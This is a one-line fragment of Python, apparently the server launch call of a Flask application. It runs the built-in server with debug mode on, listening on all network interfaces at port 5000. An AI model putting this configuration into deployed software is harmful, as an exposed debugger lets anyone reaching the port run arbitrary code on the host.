    app.run(debug=True, host='0.0.0.0', port=5000)